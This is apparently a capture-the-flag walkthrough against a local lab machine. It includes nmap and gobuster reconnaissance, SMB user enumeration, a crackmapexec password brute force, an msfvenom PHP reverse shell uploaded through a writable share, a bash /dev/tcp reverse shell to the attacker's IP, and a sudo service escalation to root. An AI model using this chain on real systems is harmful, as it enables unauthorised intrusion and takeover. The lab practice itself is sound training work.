![image](https://github.com/user-attachments/assets/cfb7fbad-3667-47b4-b108-aed57a13b859)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/07b43ae1-64f5-46ee-abf9-dc7ff8ffb339)

## **We have a webPage, lets investigate:**
![image](https://github.com/user-attachments/assets/c7db3a08-f385-436a-abb4-1fe7de5a7c3a)

## ## **Applying Fuzzing Web**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![image](https://github.com/user-attachments/assets/7ea88022-200d-4a9e-aac7-9a2ac24cf96b)

## **We have this info**

![image](https://github.com/user-attachments/assets/7d1b79c8-2ff5-4da0-9e40-d911492c6338)
![image](https://github.com/user-attachments/assets/3c0ade06-a644-4238-9035-96679c5f853a)
![image](https://github.com/user-attachments/assets/f0aa51b8-a1fc-4493-a29d-58d6ea1cb46c)

## **For now we have no information, let's investigate port 139 and 445 of SAMBA.**
```bash
rpcclient -U "" -N 172.17.0.2
enumdomusers
```
![image](https://github.com/user-attachments/assets/7804a1c9-986b-4d6d-8078-37af05d45b4d)

## **brute force to find a password but the only one we got results on is for satriani7
```bash
crackmapexec smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt
```
![image](https://github.com/user-attachments/assets/07e500b8-db5d-42cc-a25b-7d6bfb6cbf55)

## **we list resources with the new credentials**
```bash
crackmapexec smb 172.17.0.2 -u 'satriani7' -p '50cent' --shares
```
![image](https://github.com/user-attachments/assets/e5ad1173-8c48-493b-a1d1-15bfe886f1ab)

## **we connect to the shared resource**
```bash
smbclient //172.17.0.2/backup24 -U 'satriani7%50cent'
```
![image](https://github.com/user-attachments/assets/6081ca2a-2778-4abd-83a6-102b26d15e7a)

## **We download the files to our attacking machine**
```bash
mget *
```
![image](https://github.com/user-attachments/assets/a3abbe24-ba12-4c5b-8744-5ad4535dab57)
```bash
nano credentials.txt
```
![image](https://github.com/user-attachments/assets/74893465-0820-4fa7-a708-74a4fd968c5e)
Usuario: administrador
    - Contraseña: Adm1nP4ss2024

## **We go back to list shared resources but this time as administrator**
```bash
crackmapexec smb 172.17.0.2 -u 'administrador' -p 'Adm1nP4ss2024' --shares
```
![image](https://github.com/user-attachments/assets/e1571349-8879-4c95-a7a1-99d7f4ff618d)

## **We have a shared resource that allows us to read and write to it, let's list its content**
```bash
smbmap -H 172.17.0.2 -u "administrador" -p "Adm1nP4ss2024" -r home
```
![image](https://github.com/user-attachments/assets/7167afc3-3147-456d-a31f-34924302ff7a)

## **This is where all the WEB files are uploaded, so we can upload a file to get a reverseshell.**
```bash
smbclient //172.17.0.2/home -U 'administrador%Adm1nP4ss2024'
```

## **we will create our malicious file**
```bash
msfvenom -p php/reverse_php LHOST=192.168.1.228 LPORT=443 -f raw >pwned.php
```
![image](https://github.com/user-attachments/assets/6694121c-a517-418c-af17-00943f1b1807)

## **Uploading...**
```bash
put pwned.php
```
![image](https://github.com/user-attachments/assets/b2d8e7fc-fef3-491d-b4b7-5fa3e585a66c)

## **we listen on port 443 and open the browser on the website and file we want to intercept**
```
nc -nlvp 443
```
![image](https://github.com/user-attachments/assets/47f82d25-5d1f-48e2-8b26-de1c57a7a40b)
![image](https://github.com/user-attachments/assets/1decb108-b7fb-4dc0-8c6b-6f7922bb368f)
![image](https://github.com/user-attachments/assets/f762c223-d4d7-4a69-a9df-6561e862aa6a)

## **in order to stabilize our connection we are going to send us a connection through another port by sending us a shell**
```bash
nc -nlvp 444
```
![image](https://github.com/user-attachments/assets/a9558a9e-028c-4bad-8d8b-e4de00b77a0f)

## **here we send the shell from the current connection to our port 444**
```bash
bash -c "sh -i >& /dev/tcp/192.168.1.228/444 0>&1"
```
![image](https://github.com/user-attachments/assets/339b2e2f-87f1-48f7-9c73-d5050d65439a)

## **we already have a more robust connection and now we apply a TTY treatment.*
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
![image](https://github.com/user-attachments/assets/44b3d8a8-f72b-4cc5-b391-f47f4e95d4ed)

## **raising Privileges**
```bash
sudo -l
```
![image](https://github.com/user-attachments/assets/997d8255-50f6-41cf-aac7-15099934830c)
![image](https://github.com/user-attachments/assets/100867b0-4af5-4a45-86e3-97c8c7cc64d0)

```bash
sudo service ../../bin/sh
```
![image](https://github.com/user-attachments/assets/1bf4b1aa-f4d7-4341-9118-eaa8ce6820de)




